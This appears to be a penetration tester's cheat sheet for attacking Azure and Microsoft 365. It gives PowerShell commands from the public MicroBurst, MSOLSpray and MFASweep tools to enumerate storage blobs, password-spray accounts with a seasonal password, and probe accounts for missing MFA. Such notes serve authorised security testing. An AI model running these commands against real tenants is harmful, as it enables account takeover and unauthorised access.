## Blob Enumeration with MicroBurst
> https://github.com/NetSPI/MicroBurst

```powershell
Import-Module .\MicroBurst.psm1
```

```powershell
Invoke-EnumerateAzureBlobs -Base azurepentesting
```

---    
## Password Spraying w/ MSOLSpray
> https://github.com/dafthack/MSOLSpray

```powershell
Import-Module .\MSOLSpray.ps1
```
```powershell
Invoke-MSOLSpray -UserList list.txt -Password Fall2024
```

---   
## Conditional Access Check w/ MFASweep
> https://github.com/dafthack/MFASweep

```powershell
Import-Module .\ MFASweep.ps1
```

```powershell
Invoke-MFASweep -Username <user>@<domain>.com -Password Fall2024
```